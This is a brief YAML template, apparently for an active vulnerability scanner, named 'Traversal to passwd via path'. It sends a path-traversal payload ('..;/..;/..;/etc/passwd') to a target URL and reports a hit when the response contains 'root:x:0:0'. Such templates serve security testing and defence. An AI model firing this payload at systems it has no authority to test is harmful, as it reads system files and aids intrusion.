id: lfi3-142
name: 'Traversal to passwd via path'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via path'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - '..;/..;/..;/etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
